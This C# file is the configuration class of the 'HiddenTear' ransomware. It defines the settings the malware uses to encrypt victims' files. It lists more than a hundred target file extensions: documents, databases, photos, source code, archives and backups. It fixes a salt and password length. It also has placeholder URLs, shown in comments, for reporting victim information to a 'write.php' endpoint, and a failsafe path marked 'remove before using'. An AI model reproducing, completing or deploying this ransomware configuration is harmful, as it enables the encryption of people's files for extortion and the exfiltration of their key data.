using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;

namespace HiddenTear
{
    public partial class Form1
    {
        readonly ExecutionMode Mode = ExecutionMode.Fast;

        readonly string URL = "";                                          //https://www.example.com/hidden-tear/write.php?info=
        readonly string LOGURL = "";                                       //https://www.example.com/hidden-tear/write.php?info=
        readonly string CONTAINMENTPATH = "failsafe";                      //remove before using

        readonly int PASSLENGTH = 32;
        readonly byte[] SALT = new byte[] { 11, 46, 18, 4, 19, 0, 7, 62 };
        readonly string[] EXTENTIONS = new[]
        {
                ".txt", ".doc", ".docx", ".log", ".msg", ".odt", ".pages", ".rtf", ".tex", ".wpd", ".wps",//Text Files
                ".csv", ".dat", ".ged", ".key", ".keychain", ".pps", ".ppt", ".pptx", ".sdf", ".tar", ".tax2014", ".tax2015", ".vcf", ".xml", //Data Files
                ".aif", ".iff", ".m3u", ".m4a", ".mid", ".mp3", ".mpa", ".wav", ".wma", //Audio Files
                ".3g2", ".3gp", ".asf", ".avi", ".flv", ".m4v", ".mov", ".mp4", ".mpg", ".rm", ".srt", ".swf", ".vob", ".wmv", //Video Files
                ".3dm", ".3ds", ".max", ".obj", //3D Image Files
                ".bmp", ".dds", ".gif", ".jpg", ".png", ".psd", ".tga", ".thm", ".tif", ".tiff", ".yuv", //Raster Image Files
                ".ai", ".eps", ".ps", ".svg", //Vector Image Files
                ".indd", ".pct", ".pdf", //Page Layout Files
                ".xlr", ".xls", ".xlsx", //Spreadsheet Files
                ".accdb", ".db", ".dbf", ".mdb", ".pdb", ".sql", //Database Files
                ".dwg", ".dxf",//CAD Files
                ".asp", ".aspx", ".cer", ".cfm", ".csr", ".css", ".htm", ".html", ".js", ".jsp", ".php", ".rss", ".xhtml", //Web Files
                ".7z", ".cbr", ".deb", ".gz", ".pkg", ".rar", ".rpm", ".sitx", ".tar.gz", ".zip", ".zipx", //Compressed Files
                ".bin", ".cue", ".dmg", ".iso", ".mdf", ".toast", ".vcd", //Disk Image Files 
                ".c", ".class", ".cpp", ".cs", ".dtd", ".fla", ".h", ".java", ".lua", ".m", ".pl", ".py", ".sh", ".sln", ".swift", ".vb", ".vcxproj", ".xcodeproj", //Developer Files
                ".bak", ".tmp", //Backup Files
                ".crdownload", ".ics", ".msi", ".part", ".torrent", //Misc Files
        };      //http://fileinfo.com/filetypes/common
    }
    public enum ExecutionMode
    {
        Fast,
        Full
    }
}
